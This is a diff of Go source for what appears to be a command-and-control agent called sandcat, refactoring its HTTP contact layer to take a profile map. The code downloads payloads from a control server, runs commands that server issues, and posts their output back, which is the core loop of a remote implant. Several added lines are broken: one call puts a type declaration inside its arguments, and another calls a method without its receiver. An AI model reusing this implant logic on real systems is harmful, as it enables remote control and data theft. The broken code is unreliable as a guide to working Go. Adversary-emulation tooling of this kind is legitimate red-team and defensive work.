@@ -24,8 +24,8 @@ func init() {
 }
 
 //Ping tests connectivity to the server
-func (contact API) Ping(server string) bool {
-	address := fmt.Sprintf("%s/ping", server)
+func (contact API) Ping(profile map[string]interface{}) bool {
+	address := fmt.Sprintf("%s/ping", profile["server"].(string))
 	bites := request(address, nil)
 	if(string(bites) == "pong") {
 		output.VerbosePrint("[+] Ping success")
@@ -55,12 +55,12 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 }
 
 //DropPayloads downloads all required payloads for a command
-func (contact API) DropPayloads(payload string, server string, uniqueId string) []string{
+func (contact API) DropPayloads(profile map[string]interface{}, payload string) []string{
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	var droppedPayloads []string
 	for _, payload := range payloads {
 		if len(payload) > 0 {
-			droppedPayloads = append(droppedPayloads, drop(server, payload))
+			droppedPayloads = append(droppedPayloads, contact.Drop(profile map[string]interface{}, payload))
 		}
 	}
 	return droppedPayloads
@@ -70,19 +70,20 @@ func (contact API) DropPayloads(payload string, server string, uniqueId string) 
 func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
     timeout := int(command["timeout"].(float64))
 	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
-	sendExecutionResults(command["id"], profile["server"], result, status, cmd, pid)
+	SendExecutionResults(profile, command["id"], result, status, cmd, pid)
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (contact API) C2RequirementsMet(criteria interface{}) bool {
+func (contact API) C2RequirementsMet(profile map[string]interface{}, criteria interface{}) bool {
 	return true
 }
 
-func drop(server string, payload string) string {
+//Drop will download a single payload
+func (contact API) Drop(profile map[string]interface{}, payload string) string {
 	location := filepath.Join(payload)
 	if len(payload) > 0 && util.Exists(location) == false {
 		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
-		address := fmt.Sprintf("%s/file/download", server)
+		address := fmt.Sprintf("%s/file/download", profile["server"].(string))
 		req, _ := http.NewRequest("POST", address, nil)
 		req.Header.Set("file", payload)
 		req.Header.Set("platform", string(runtime.GOOS))
@@ -95,8 +96,9 @@ func drop(server string, payload string) string {
 	return location
 }
 
-func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string) {
-	address := fmt.Sprintf("%s/results", server)
+//SendExecutionResults will send the execution results to the server.
+func (contact API) SendExecutionResults(profile map[string]interface{}, commandID interface{}, result []byte, status string, cmd string, pid string) {
+	address := fmt.Sprintf("%s/results", profile["server"].(string))
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
 	request(address, data)
